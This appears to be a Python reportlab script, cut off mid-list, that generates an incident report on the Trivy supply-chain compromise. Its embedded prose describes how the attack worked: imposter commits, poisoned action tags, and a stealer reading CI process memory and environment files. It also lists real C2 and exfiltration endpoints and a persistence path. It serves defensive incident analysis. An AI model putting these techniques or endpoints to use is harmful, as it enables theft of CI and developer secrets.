"""Generate an incident-detail PDF report for the Trivy security incident CVE-2026-33634."""

import os
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple

from reportlab.lib import colors
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import cm, mm
from reportlab.platypus import (
    BaseDocTemplate,
    Frame,
    Image,
    NextPageTemplate,
    PageBreak,
    PageTemplate,
    Paragraph,
    Spacer,
    Table,
    TableStyle,
)
from reportlab.graphics.shapes import Drawing, Line, Rect, String, Circle, Polygon
from reportlab.graphics import renderPDF

from .models import Finding, SEVERITY_RANK

import re as _re

# ── Reference URL mapping (for clickable citation links) ─────────────────────
_REF_URLS = {
    1: "https://github.com/aquasecurity/trivy/discussions/10425",
    2: "https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23",
    3: "https://labs.boostsecurity.io/articles/20-days-later-trivy-compromise-act-ii/",
    4: "http://rosesecurity.dev/2026/03/20/typosquatting-trivy.html",
    5: "https://www.stepsecurity.io/blog/trivy-compromised-a-second-time---malicious-v0-69-4-release",
    6: "https://socket.dev/supply-chain-attacks/trivy-github-actions-compromise",
    7: "https://www.wiz.io/blog/trivy-compromised-teampcp-supply-chain-attack",
    8: "https://ramimac.me/trivy-teampcp/#iocs",
    9: "https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation",
    10: "https://github.com/aquasecurity/trivy/discussions/10425#discussioncomment-16258390",
    11: "https://github.com/aquasecurity/trivy/discussions/10425#discussioncomment-16261683",
    12: "https://github.com/Homebrew/homebrew-core/pull/273304",
}


def _cite_link(text: str) -> str:
    """Replace [N] citation markers with clickable PDF hyperlinks."""
    def _repl(m: "_re.Match") -> str:
        n = int(m.group(1))
        url = _REF_URLS.get(n, "")
        if url:
            return f'<a href="{url}" color="#1565c0">[{n}]</a>'
        return m.group(0)
    return _re.sub(r'\[(\d+)\]', _repl, text)

# ── Colour palette ────────────────────────────────────────────────────────────
CLR_DARK = colors.HexColor("#1a1a2e")
CLR_ACCENT = colors.HexColor("#e94560")
CLR_ACCENT2 = colors.HexColor("#0f3460")
CLR_BG_LIGHT = colors.HexColor("#f5f5f5")
CLR_WHITE = colors.white
CLR_BLACK = colors.black
CLR_CRITICAL = colors.HexColor("#d32f2f")
CLR_HIGH = colors.HexColor("#f57c00")
CLR_MEDIUM = colors.HexColor("#fbc02d")
CLR_GREEN = colors.HexColor("#388e3c")
CLR_GREY = colors.HexColor("#757575")
CLR_LIGHT_RED = colors.HexColor("#ffebee")
CLR_LIGHT_ORANGE = colors.HexColor("#fff3e0")
CLR_LIGHT_GREY = colors.HexColor("#eeeeee")

SEVERITY_COLOURS = {
    "CRITICAL": CLR_CRITICAL,
    "HIGH": CLR_HIGH,
    "MEDIUM": CLR_MEDIUM,
}

PAGE_W, PAGE_H = A4
MARGIN = 2 * cm

# ── Styles ────────────────────────────────────────────────────────────────────
_styles = getSampleStyleSheet()


def _style(name: str, **kw) -> ParagraphStyle:
    return ParagraphStyle(name, **kw)


S_TITLE = _style("S_TITLE", fontName="Helvetica-Bold", fontSize=28, leading=34,
                  textColor=CLR_WHITE, alignment=TA_CENTER)
S_SUBTITLE = _style("S_SUBTITLE", fontName="Helvetica", fontSize=14, leading=18,
                     textColor=colors.HexColor("#cccccc"), alignment=TA_CENTER)
S_H1 = _style("S_H1", fontName="Helvetica-Bold", fontSize=18, leading=22,
               textColor=CLR_ACCENT2, spaceBefore=18, spaceAfter=8)
S_H2 = _style("S_H2", fontName="Helvetica-Bold", fontSize=14, leading=17,
               textColor=CLR_DARK, spaceBefore=12, spaceAfter=6)
S_H3 = _style("S_H3", fontName="Helvetica-Bold", fontSize=11, leading=14,
               textColor=CLR_ACCENT2, spaceBefore=8, spaceAfter=4)
S_BODY = _style("S_BODY", fontName="Helvetica", fontSize=10, leading=14,
                 textColor=CLR_BLACK, alignment=TA_JUSTIFY, spaceBefore=2, spaceAfter=4)
S_BODY_SMALL = _style("S_BODY_SMALL", fontName="Helvetica", fontSize=8.5, leading=11,
                       textColor=CLR_BLACK, spaceBefore=1, spaceAfter=2)
S_BULLET = _style("S_BULLET", fontName="Helvetica", fontSize=10, leading=14,
                   textColor=CLR_BLACK, leftIndent=18, bulletIndent=6,
                   spaceBefore=1, spaceAfter=1)
S_CODE = _style("S_CODE", fontName="Courier", fontSize=8, leading=10,
                 textColor=CLR_DARK, backColor=CLR_LIGHT_GREY, leftIndent=8,
                 spaceBefore=2, spaceAfter=2)
S_REF = _style("S_REF", fontName="Helvetica", fontSize=9, leading=12,
                textColor=colors.HexColor("#1565c0"), spaceBefore=1, spaceAfter=1)
S_FOOTER = _style("S_FOOTER", fontName="Helvetica", fontSize=7, leading=9,
                   textColor=CLR_GREY, alignment=TA_CENTER)
S_TH = _style("S_TH", fontName="Helvetica-Bold", fontSize=9, leading=11,
               textColor=CLR_WHITE)
S_TD = _style("S_TD", fontName="Helvetica", fontSize=8.5, leading=11,
               textColor=CLR_BLACK)
S_TD_BOLD = _style("S_TD_BOLD", fontName="Helvetica-Bold", fontSize=8.5, leading=11,
                    textColor=CLR_BLACK)
S_SEVERITY = _style("S_SEVERITY", fontName="Helvetica-Bold", fontSize=9, leading=11,
                     textColor=CLR_WHITE, alignment=TA_CENTER)


# ── Drawing helpers ───────────────────────────────────────────────────────────

def _arrow_polygon(x: float, y: float, direction: str = "down", size: float = 6) -> Polygon:
    """Small arrow indicator."""
    if direction == "down":
        pts = [x, y + size, x + size, y + size, x + size / 2, y]
    elif direction == "right":
        pts = [x, y, x, y + size, x + size, y + size / 2]
    else:
        pts = [x, y, x + size, y, x + size / 2, y + size]
    return Polygon(pts, fillColor=CLR_ACCENT, strokeColor=None)


def _build_attack_flow_diagram() -> Drawing:
    """Create a supply-chain attack flow diagram."""
    w, h = 480, 420
    d = Drawing(w, h)

    # Background
    d.add(Rect(0, 0, w, h, fillColor=colors.HexColor("#fafafa"),
               strokeColor=CLR_LIGHT_GREY, strokeWidth=0.5, rx=4))

    # Title
    d.add(String(w / 2, h - 20, "Supply-Chain Attack Flow",
                 fontName="Helvetica-Bold", fontSize=12,
                 fillColor=CLR_DARK, textAnchor="middle"))

    # --- Boxes ---
    box_w, box_h = 130, 40
    boxes = [
        # (x, y, label, color)
        (175, h - 75, "Stolen aqua-bot PAT\n(Feb 27 Pwn Request)", CLR_CRITICAL),
        (175, h - 140, "Imposter Commits\n(trivy + actions/checkout)", CLR_CRITICAL),
        (40, h - 220, "trivy-action\n(Tags 0.0.1-0.34.2)", CLR_HIGH),
        (175, h - 220, "setup-trivy\n(All Tags Poisoned)", CLR_HIGH),
        (310, h - 220, "trivy v0.69.4-6\n(Docker Hub, GCR, ECR,\nGHCR, APT/RPM)", CLR_HIGH),
        (175, h - 300, "Runner.Worker Memory\nRead + Cred Harvesting", CLR_CRITICAL),
        (175, h - 370, "Exfil: scan.aquasecurtiy.org\nFallback: tpcp-docs repo", CLR_CRITICAL),
    ]

    for bx, by, label, clr in boxes:
        d.add(Rect(bx, by, box_w, box_h, fillColor=clr, strokeColor=None, rx=4))
        lines = label.split("\n")
        for i, line in enumerate(lines):
            ly = by + box_h / 2 + 4 - i * 12
            d.add(String(bx + box_w / 2, ly, line,
                         fontName="Helvetica-Bold", fontSize=8,
                         fillColor=CLR_WHITE, textAnchor="middle"))

    # --- Arrows (vertical lines connecting boxes) ---
    arrow_clr = CLR_GREY
    line_w = 1.5

    # Compromised account -> Malicious commit
    cx = 175 + box_w / 2
    d.add(Line(cx, h - 75, cx, h - 100, strokeColor=arrow_clr, strokeWidth=line_w))
    d.add(_arrow_polygon(cx - 3, h - 107, "down"))

    # Malicious commit -> three action boxes
    d.add(Line(cx, h - 140, cx, h - 155, strokeColor=arrow_clr, strokeWidth=line_w))
    # horizontal spread line
    d.add(Line(40 + box_w / 2, h - 155, 310 + box_w / 2, h - 155,
               strokeColor=arrow_clr, strokeWidth=line_w))
    # verticals down to each box
    for bx in [40, 175, 310]:
        bx_c = bx + box_w / 2
        d.add(Line(bx_c, h - 155, bx_c, h - 175, strokeColor=arrow_clr, strokeWidth=line_w))
        d.add(_arrow_polygon(bx_c - 3, h - 182, "down"))

    # Three boxes -> CI pipeline
    for bx in [40, 175, 310]:
        bx_c = bx + box_w / 2
        d.add(Line(bx_c, h - 220, bx_c, h - 240, strokeColor=arrow_clr, strokeWidth=line_w))
    d.add(Line(40 + box_w / 2, h - 240, 310 + box_w / 2, h - 240,
               strokeColor=arrow_clr, strokeWidth=line_w))
    d.add(Line(cx, h - 240, cx, h - 255, strokeColor=arrow_clr, strokeWidth=line_w))
    d.add(_arrow_polygon(cx - 3, h - 262, "down"))

    # CI pipeline -> exfiltration
    d.add(Line(cx, h - 300, cx, h - 325, strokeColor=arrow_clr, strokeWidth=line_w))
    d.add(_arrow_polygon(cx - 3, h - 332, "down"))

    return d


def _build_timeline_diagram(findings: List[Finding]) -> Drawing:
    """Create a timeline showing exposure windows and finding positions."""
    w, h = 480, 180
    d = Drawing(w, h)

    d.add(Rect(0, 0, w, h, fillColor=colors.HexColor("#fafafa"),
               strokeColor=CLR_LIGHT_GREY, strokeWidth=0.5, rx=4))

    d.add(String(w / 2, h - 16, "Exposure Windows & Finding Timeline (March 19-20, 2026 UTC)",
                 fontName="Helvetica-Bold", fontSize=10,
                 fillColor=CLR_DARK, textAnchor="middle"))

    # Time axis: Mar 19 00:00 to Mar 20 12:00 = 36 hours
    ax_left, ax_right = 50, w - 20
    ax_y = 35
    ax_w = ax_right - ax_left

    d.add(Line(ax_left, ax_y, ax_right, ax_y, strokeColor=CLR_DARK, strokeWidth=1))

    # Hour ticks every 6h
    for hr in range(0, 37, 6):
        x = ax_left + (hr / 36) * ax_w
        d.add(Line(x, ax_y - 4, x, ax_y + 4, strokeColor=CLR_DARK, strokeWidth=0.5))
        day = 19 if hr < 24 else 20
        hour = hr if hr < 24 else hr - 24
        d.add(String(x, ax_y - 14, f"Mar {day}\n{hour:02d}:00",
                      fontName="Helvetica", fontSize=6,
                      fillColor=CLR_GREY, textAnchor="middle"))

    # Exposure window bars
    windows = [
        ("trivy", 18.37, 21.70, 130, CLR_CRITICAL),
        ("trivy-action", 17.72, 29.67, 105, CLR_HIGH),
        ("setup-trivy", 17.72, 21.73, 80, CLR_MEDIUM),
    ]
    for name, start_h, end_h, y_pos, clr in windows:
        x1 = ax_left + (start_h / 36) * ax_w
        x2 = ax_left + (min(end_h, 36) / 36) * ax_w
        d.add(Rect(x1, y_pos, x2 - x1, 16, fillColor=clr, strokeColor=None, rx=2,
                    fillOpacity=0.7))
        d.add(String(x1 - 2, y_pos + 4, name,
                     fontName="Helvetica-Bold", fontSize=7,
                     fillColor=CLR_DARK, textAnchor="end"))

    # Finding dots on timeline
    for f in findings:
        if not f.run_time_utc:
            continue
        try:
            dt = datetime.fromisoformat(f.run_time_utc.replace("Z", "+00:00"))
            # hours since Mar 19 00:00 UTC
            base = datetime(2026, 3, 19, tzinfo=timezone.utc)
            hrs = (dt - base).total_seconds() / 3600
            if 0 <= hrs <= 36:
                x = ax_left + (hrs / 36) * ax_w
                clr = SEVERITY_COLOURS.get(f.severity, CLR_GREY)
                d.add(Circle(x, ax_y + 8, 3, fillColor=clr, strokeColor=CLR_WHITE, strokeWidth=0.5))
        except Exception:
            pass

    # Legend box (left side)
    leg_x, leg_y = 8, h - 70
    leg_w, leg_h = 72, 50
    d.add(Rect(leg_x, leg_y, leg_w, leg_h, fillColor=CLR_WHITE,
               strokeColor=CLR_LIGHT_GREY, strokeWidth=0.5, rx=3))
    d.add(String(leg_x + leg_w / 2, leg_y + leg_h - 10, "Severity",
                 fontName="Helvetica-Bold", fontSize=7,
                 fillColor=CLR_DARK, textAnchor="middle"))
    for i, (label, clr) in enumerate([("CRITICAL", CLR_CRITICAL), ("HIGH", CLR_HIGH), ("MEDIUM", CLR_MEDIUM)]):
        ly = leg_y + leg_h - 22 - i * 12
        d.add(Circle(leg_x + 12, ly + 2, 4, fillColor=clr, strokeColor=None))
        d.add(String(leg_x + 20, ly - 1, label,
                     fontName="Helvetica", fontSize=7, fillColor=CLR_DARK))

    return d


# ── Page templates ────────────────────────────────────────────────────────────

def _cover_page(canvas, doc):
    canvas.saveState()
    # Dark background
    canvas.setFillColor(CLR_DARK)
    canvas.rect(0, 0, PAGE_W, PAGE_H, fill=1, stroke=0)
    # Accent bar
    canvas.setFillColor(CLR_ACCENT)
    canvas.rect(0, PAGE_H * 0.42, PAGE_W, 4, fill=1, stroke=0)
    canvas.restoreState()


def _normal_page(canvas, doc):
    canvas.saveState()
    # Header line
    canvas.setStrokeColor(CLR_ACCENT2)
    canvas.setLineWidth(0.5)
    canvas.line(MARGIN, PAGE_H - MARGIN + 10, PAGE_W - MARGIN, PAGE_H - MARGIN + 10)
    # Footer
    canvas.setFont("Helvetica", 7)
    canvas.setFillColor(CLR_GREY)
    canvas.drawCentredString(PAGE_W / 2, 1.2 * cm,
                             f"trivyincident — Page {doc.page}")
    canvas.setStrokeColor(CLR_LIGHT_GREY)
    canvas.line(MARGIN, 1.5 * cm, PAGE_W - MARGIN, 1.5 * cm)
    canvas.restoreState()


# ── Table helper ──────────────────────────────────────────────────────────────

def _make_table(headers: List[str], rows: List[List], col_widths: Optional[List[float]] = None) -> Table:
    """Build a styled Table with header row."""
    header_cells = [Paragraph(h, S_TH) for h in headers]
    data = [header_cells]
    for row in rows:
        data.append([Paragraph(_cite_link(str(c)), S_TD) for c in row])

    t = Table(data, colWidths=col_widths, repeatRows=1)
    style_cmds = [
        ("BACKGROUND", (0, 0), (-1, 0), CLR_ACCENT2),
        ("TEXTCOLOR", (0, 0), (-1, 0), CLR_WHITE),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("BOTTOMPADDING", (0, 0), (-1, 0), 6),
        ("TOPPADDING", (0, 0), (-1, 0), 6),
        ("FONTSIZE", (0, 1), (-1, -1), 8),
        ("TOPPADDING", (0, 1), (-1, -1), 3),
        ("BOTTOMPADDING", (0, 1), (-1, -1), 3),
        ("GRID", (0, 0), (-1, -1), 0.4, CLR_LIGHT_GREY),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ]
    # Alternate row colours
    for i in range(1, len(data)):
        if i % 2 == 0:
            style_cmds.append(("BACKGROUND", (0, i), (-1, i), colors.HexColor("#f8f9fa")))
    t.setStyle(TableStyle(style_cmds))
    return t


def _severity_badge(sev: str) -> str:
    clr = {"CRITICAL": "#d32f2f", "HIGH": "#f57c00", "MEDIUM": "#fbc02d"}.get(sev, "#757575")
    return f'<font color="{clr}"><b>{sev}</b></font>'


# ── Main entry point ──────────────────────────────────────────────────────────

def write_incident_pdf(
    output_path: str,
    org: str,
    run_start_iso: str,
    run_end_iso: str,
    repos_scanned: int,
    total_runs: int,
    findings: List[Finding],
) -> None:
    """Write the incident detail PDF to *output_path*."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)

    frame_cover = Frame(MARGIN, MARGIN, PAGE_W - 2 * MARGIN, PAGE_H - 2 * MARGIN,
                        id="cover")
    frame_body = Frame(MARGIN, 2 * cm, PAGE_W - 2 * MARGIN, PAGE_H - 4 * cm,
                       id="body")

    doc = BaseDocTemplate(
        output_path,
        pagesize=A4,
        leftMargin=MARGIN,
        rightMargin=MARGIN,
        topMargin=MARGIN,
        bottomMargin=MARGIN,
    )
    doc.addPageTemplates([
        PageTemplate(id="Cover", frames=[frame_cover], onPage=_cover_page),
        PageTemplate(id="Body", frames=[frame_body], onPage=_normal_page),
    ])

    story: List = []

    # ── COVER PAGE ────────────────────────────────────────────────────────
    story.append(Spacer(1, PAGE_H * 0.25))
    story.append(Paragraph("Trivy Security Incident<br/>2026-03-19", S_TITLE))
    story.append(Spacer(1, 12))
    story.append(Paragraph("CVE-2026-33634 / GHSA-69fq-xp46-6x23", S_SUBTITLE))
    story.append(Spacer(1, 8))
    story.append(Paragraph(f"Organization: <b>{org}</b>", S_SUBTITLE))
    story.append(Spacer(1, 6))
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    story.append(Paragraph(f"Generated: {now}", S_SUBTITLE))

    story.append(NextPageTemplate("Body"))
    story.append(PageBreak())

    # ── TABLE OF CONTENTS (manual) ────────────────────────────────────────
    story.append(Paragraph("Table of Contents", S_H1))
    toc_items = [
        "1. Executive Summary",
        "2. Attack Overview",
        "   2.1-2.6  Precursor, Phases, Payload, Impact",
        "   2.7-2.9  Stolen Secrets, PAT Scope, Deception Techniques",
        "   2.10     Technical Deep Dive: Exploit Code Analysis",
        "3. Attack Flow Diagram",
        "4. Exposure Windows",
        "5. Timeline & Findings",
        "6. Indicators of Compromise (IOCs)",
        "7. Affected Repositories",
        "8. Detailed Findings",
        "9. Remediation Guidance",
        "10. References",
    ]
    for item in toc_items:
        story.append(Paragraph(item, S_BODY))
    story.append(PageBreak())

    # ── 1. EXECUTIVE SUMMARY ──────────────────────────────────────────────
    story.append(Paragraph("1. Executive Summary", S_H1))
    story.append(Paragraph(_cite_link(
        "On March 19, 2026, the Aqua Security Trivy ecosystem was compromised for the second "
        "time in three weeks by threat group <b>TeamPCP</b> (also tracked as PCPcat by Wiz Research [7]), "
        "a significant threat to cloud-native infrastructure that "
        "emerged in late 2025. This was a continuation of the February 27-28, 2026 incident where "
        "two separate threat actors &mdash; <b>MegaGame10418</b> (GitHub ID 255326329, fork "
        "activity flagged February 27) and autonomous bot <b>hackerbot-claw</b> (February 28) "
        "&mdash; exploited vulnerable <font name='Courier'>pull_request_target</font> "
        "workflows in aquasecurity/trivy to exfiltrate the <font name='Courier'>aqua-bot</font> "
        "Personal Access Token (PAT) [9]. The PAT was rotated around February 28 at ~06:08 UTC, but "
        "credential rotation was not atomic &mdash; the attacker may have been privy to refreshed "
        "tokens [3][11]. This incident has been assigned "
        "<b>GHSA-69fq-xp46-6x23</b> [2]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))
    story.append(Paragraph(_cite_link(
        "The second compromise affected <b>trivy</b> (malicious v0.69.4 binary published via "
        "release automation) [3], <b>trivy-action</b> (credential stealer injected via imposter "
        "commits into 75 of 76 version tags, from 0.0.1 through 0.34.2; only 0.35.0 was "
        "unaffected, protected by GitHub immutable releases) [5][6], and <b>setup-trivy</b> (all 7 "
        "tags rewritten via imposter commits) [5]. The malicious payload harvested Runner process "
        "environment variables, read GitHub Actions Runner.Worker process memory to extract "
        "secrets marked <font name='Courier'>isSecret: true</font>, and exfiltrated encrypted "
        "data to the typosquat C2 domain <font name='Courier'>scan.aquasecurtiy.org</font> "
        "(note: 'securtiy' &mdash; a deliberate typo of 'security') [4][5]. The domain was registered "
        "on March 17 through Spaceship, Inc., with Let's Encrypt certificates issued within "
        "50 minutes of registration [4]; the server sat on AS48090 (DMZHOST), IP 45.148.10.212 "
        "(TECHOFF SRV LIMITED, Amsterdam, NL) [4][8]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    # Severity summary counts
    sev_counts: Dict[str, int] = {}
    for f in findings:
        sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1
    crit = sev_counts.get("CRITICAL", 0)
    high = sev_counts.get("HIGH", 0)
    med = sev_counts.get("MEDIUM", 0)

    story.append(Paragraph(
        f"<b>Scan scope:</b> {repos_scanned} repositories, {total_runs} workflow runs scanned "
        f"between {run_start_iso} and {run_end_iso}.",
        S_BODY,
    ))
    story.append(Paragraph(
        f"<b>Findings:</b> {len(findings)} total — "
        f'<font color="#d32f2f"><b>{crit} CRITICAL</b></font>, '
        f'<font color="#f57c00"><b>{high} HIGH</b></font>, '
        f'<font color="#fbc02d"><b>{med} MEDIUM</b></font>.',
        S_BODY,
    ))
    story.append(PageBreak())

    # ── 2. ATTACK OVERVIEW ────────────────────────────────────────────────
    story.append(Paragraph("2. Attack Overview", S_H1))

    story.append(Paragraph("2.1 Precursor: First Compromise (February 28, 2026)", S_H2))
    story.append(Paragraph(_cite_link(
        "On February 27, 2026, GitHub user <b>MegaGame10418</b> (GitHub ID 255326329, since "
        "banned) was flagged by Package Threat Hunter for suspicious fork activity targeting "
        "aquasecurity/trivy. Separately, on February 28, autonomous bot <b>hackerbot-claw</b> "
        "(an AI-powered security research agent, account created February 20 [9]) executed a "
        "Pwn Request against Trivy's CI via PR #10254, exploiting a vulnerable "
        "<font name='Courier'>pull_request_target</font> workflow to exfiltrate the "
        "<font name='Courier'>aqua-bot</font> Personal Access Token (PAT), stored as "
        "<font name='Courier'>ORG_REPO_TOKEN</font> with org-scoped "
        "<font name='Courier'>repo</font> permissions used in at least 33 workflows across "
        "the aquasecurity org [3][9]. hackerbot-claw validated the stolen credentials "
        "by creating branches named <font name='Courier'>U+1F916 U+1F99E</font> (robot-and-lobster emoji) on aquasecurity/trivy [9]. "
        "Using the stolen PAT, the attacker privatized the repository, deleted all "
        "GitHub Releases between v0.27.0 and v0.69.1, and pushed a suspicious artifact to the "
        "Trivy VSCode extension on Open VSX [9]. Aqua Security disclosed the incident in "
        "discussion #10265 and remediated the immediate damage [1][9]. Evidence from scheduled workflow "
        "failures on <font name='Courier'>vuln-list-update/debian.yml</font> shows "
        "<font name='Courier'>ORG_REPO_TOKEN</font> was rotated around Feb 28 at ~06:08 UTC [3], "
        "but <b>credential rotation was not atomic</b> &mdash; the attacker may "
        "have been privy to refreshed tokens [3][11]. How the attacker regained push access for the "
        "March 19 attack remains under investigation [3]."),
        S_BODY,
    ))

    story.append(Paragraph("2.2 Second Compromise (March 19, 2026)", S_H2))
    story.append(Paragraph(
        "Three weeks later, through a re-entry vector still under investigation, "
        "the attacker launched a coordinated multi-phase supply-chain attack:",
        S_BODY,
    ))

    story.append(Spacer(1, 6))
    story.append(Paragraph("2.3 Attack Phases", S_H2))

    story.append(Paragraph("<b>Phase 1 — Imposter Commits &amp; Malicious Release</b>", S_H3))
    story.append(Paragraph(_cite_link(
        "The attacker created <b>imposter commits</b> &mdash; malicious commits pushed via forks that "
        "don't belong to any branch on the target repository [3]. Both commits were unsigned. "
        "An imposter commit in "
        "<font name='Courier'>actions/checkout</font> @ <font name='Courier'>70379aad</font> "
        "(impersonating Guillermo Rauch, CEO of Vercel, with message 'Fix tag handling: preserve "
        "annotations and explicit fetch-tags (#2356)') replaced the Node.js checkout action with "
        "a composite action that fetched four malicious Go source files and a "
        "<font name='Courier'>.golangci.yaml</font> linter override from the typosquat C2 "
        "<font name='Courier'>scan.aquasecurtiy.org</font> [3][4]. The linter override (a Living Off The "
        "Pipeline technique) ensured the backdoor passed CI lint checks [3]. "
        "A second imposter commit in <font name='Courier'>aquasecurity/trivy</font> @ "
        "<font name='Courier'>1885610c</font> (impersonating "
        "contributor DmitriyLewen, with message 'fix(ci): Use correct checkout pinning') pinned "
        "<font name='Courier'>actions/checkout</font> to the malicious SHA and added "
        "<font name='Courier'>--skip=validate</font> to GoReleaser to bypass build output "
        "validation [3]. Cosmetic quote-style reformatting was scattered through the YAML to bury "
        "the real changes in diff noise [3]. "
        "The attacker initially pushed a <font name='Courier'>v0.70.0</font> tag at 17:51 UTC, "
        "then deleted it &mdash; likely a botched first attempt with a version number that would "
        "raise alarms since no v0.70.x release branch existed &mdash; and fell back to "
        "<font name='Courier'>v0.69.4</font> to blend into the existing release series [3]. "
        "The v0.69.4 tag triggered the Release workflow, which logged into Docker Hub, GHCR, "
        "and AWS ECR using org secrets, built multi-platform binaries with GoReleaser "
        "(validation skipped), and distributed compromised binaries to "
        "GitHub Releases, GHCR, Docker Hub, ECR Public, APT/RPM repos, and get.trivy.dev [3][5]. "
        "The full build took ~40 minutes; the poisoned release was published at ~18:22 UTC [5]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Phase 2 — Lateral Movement via aqua-bot</b>", S_H3))
    story.append(Paragraph(_cite_link(
        "Using the compromised <font name='Courier'>aqua-bot</font> identity, the attacker "
        "injected malicious workflows into <font name='Courier'>aquasecurity/tfsec</font>, "
        "<font name='Courier'>aquasecurity/traceeshark</font>, and "
        "<font name='Courier'>aquasecurity/trivy-action</font> to dump secrets via a "
        "Cloudflare Tunnel exfiltration endpoint [5][7][8]. These workflows posted collected credentials "
        "(including GITHUB_TOKEN, Docker Hub tokens, GPG keys, and Slack webhooks) to "
        "<font name='Courier'>plug-tab-protective-relay.trycloudflare.com/exfil</font> [7][8]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Phase 3 — Malicious Action Tags Published</b>", S_H3))
    story.append(Paragraph(_cite_link(
        "Using compromised credentials, the attacker force-pushed 75 of 76 version tags on "
        "<font name='Courier'>trivy-action</font> (0.0.1 through 0.34.2; only 0.35.0 was "
        "unaffected, protected by GitHub's immutable releases feature) [5][6]. Tag force-pushes are "
        "invisible to GitHub Archive event data, a fundamental blind spot for event-based "
        "monitoring [6]. At 22:06-22:08 UTC, <font name='Courier'>aqua-bot</font> published 7 "
        "releases on <font name='Courier'>setup-trivy</font> in under three minutes "
        "(v0.1.0 through v0.2.5) via the GitHub API, rewriting every historical version [5]. "
        "Tags were pointed to imposter "
        "commits containing a three-stage credential stealer injected into "
        "<font name='Courier'>entrypoint.sh</font> and <font name='Courier'>action.yaml</font> [4][5]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("<b>Phase 4 — Obfuscation: Spam Flood</b>", S_H3))
    story.append(Paragraph(_cite_link(
        "The attacker actively worked to delay and disrupt the community response [3]. "
        "<font name='Courier'>aqua-bot</font> deleted discussion #10265 (the original "
        "February incident thread where the community was also coordinating the new response), "
        "removing the thread to slow recognition of the v0.69.4 compromise [3][5]. "
        "When <font name='Courier'>devinbfergy</font> opened discussion #10420 at 22:13 UTC "
        "to ask why the discussion was deleted [1], "
        "<b>47 spam bot accounts</b> flooded the thread within a 12-second window at "
        "00:08 UTC on March 20 [3]. Two accounts posted taunts at 00:01 UTC "
        "with the message <font name='Courier'>sugma and ligma, teampcp owns you.</font> [3] "
        "At least 17 of the bot accounts posted generic praise comments (e.g., 'this solved "
        "my issue', 'worked perfectly for me') within a single second to bury the technical "
        "discussion [3]. Two-thirds of the bot accounts were over 2 years old with real-looking "
        "activity profiles (repos, followers, stars), suggesting compromised dormant accounts "
        "or accounts purchased from underground markets [3]."),
        S_BODY,
    ))
    story.append(Spacer(1, 4))

    story.append(Paragraph("2.4 Payload Analysis", S_H2))
    story.append(Paragraph(
        "The credential stealer operated in three stages:",
        S_BODY,
    ))
    payload_stages = [
        "<b>Collect:</b> Harvested Runner process environment variables from "
        "<font name='Courier'>/proc/*/environ</font>, filtering for keys matching 'env' or "
        "'ssh' (catching SSH_PRIVATE_KEY, ENV_FILE, etc.) and following file paths "
        "to read their contents [4][5]. Read "
        "<font name='Courier'>Runner.Worker</font> process memory via "
        "<font name='Courier'>/proc/&lt;pid&gt;/mem</font>, searching for the pattern "
        '<font name=\'Courier\'>{\'value\':\'&lt;secret&gt;\',\'isSecret\':true}</font> [4][5]. '
        "On non-Linux platforms, ran a comprehensive credential stealer (self-described as "
        "'TeamPCP Cloud stealer') targeting SSH keys, "
        "Git credentials, AWS/GCP/Azure credentials, cloud IMDS endpoints (ECS/EC2), "
        "Kubernetes secrets, Docker configs (including Kaniko paths), NPM/Vault tokens, "
        "database credentials (MySQL/PostgreSQL/MongoDB/Redis), WireGuard configs, Terraform "
        "state and tfvars, TLS private keys, Slack/Discord webhook URLs, and crypto wallets "
        "(Solana, Bitcoin, Litecoin, Dogecoin, Ethereum, Cardano, Zcash, Dash, Ripple, Monero) [4].",
        "<b>Encrypt:</b> All collected data was encrypted with a hardcoded RSA-4096 public key "
        "using hybrid encryption (AES-256-CBC + RSA-OAEP), bundled as "
        "<font name='Courier'>tpcp.tar.gz</font> [4][5].",
        "<b>Exfiltrate:</b> Encrypted payload was sent via HTTPS POST to the typosquat C2 domain "
        "<font name='Courier'>scan.aquasecurtiy.org</font> (45.148.10.212, TECHOFF SRV LIMITED, "
        "Amsterdam, NL) [4][8]. Fallback: if the C2 was unreachable and a GitHub PAT was available, "
        "the payload created a public repository called <font name='Courier'>tpcp-docs</font> "
        "on the victim's GitHub account and uploaded the stolen data as a release asset [4][5]. "
        "A secondary exfiltration endpoint via Cloudflare Tunnel "
        "(<font name='Courier'>plug-tab-protective-relay.trycloudflare.com/exfil</font>) "
        "was used for credentials stolen from Aqua Security's own repos [7][8].",
    ]
    for ps in payload_stages:
        story.append(Paragraph(_cite_link(f"\u2022 {ps}"), S_BULLET))
        story.append(Spacer(1, 3))

    story.append(Spacer(1, 4))
    story.append(Paragraph("<b>Persistence Mechanism (developer machines):</b>", S_H3))
    story.append(Paragraph(_cite_link(
        "When the malicious v0.69.4 binary detected it was running outside of GitHub Actions "
        "(<font name='Courier'>GITHUB_ACTIONS != 'true'</font>), it dropped a Python script to "
        "<font name='Courier'>~/.config/systemd/user/sysmon.py</font> and created a systemd user "
        "unit to run it persistently [7]. The script polled "
        "<font name='Courier'>tdtqy-oyaaa-aaaae-af2dq-cai.raw.icp0.io</font> (an ICP-hosted "
        "endpoint shared with the CanisterWorm npm worm) every five minutes, downloading and "
        "executing whatever payload it received [7]. This means developers who ran the compromised "
        "trivy binary locally received a persistent backdoor on their workstations [7]."),
        S_BODY,
    ))

    story.append(Paragraph("2.5 Subsequent Phases (Post March 20)", S_H2))
    story.append(Paragraph(
        "The attack continued to evolve after the initial compromise window:",
        S_BODY,
    ))
    subsequent = [
        "<b>Docker Hub, GCR.io &amp; ECR Push (Mar 22):</b> Attacker pushed malicious "
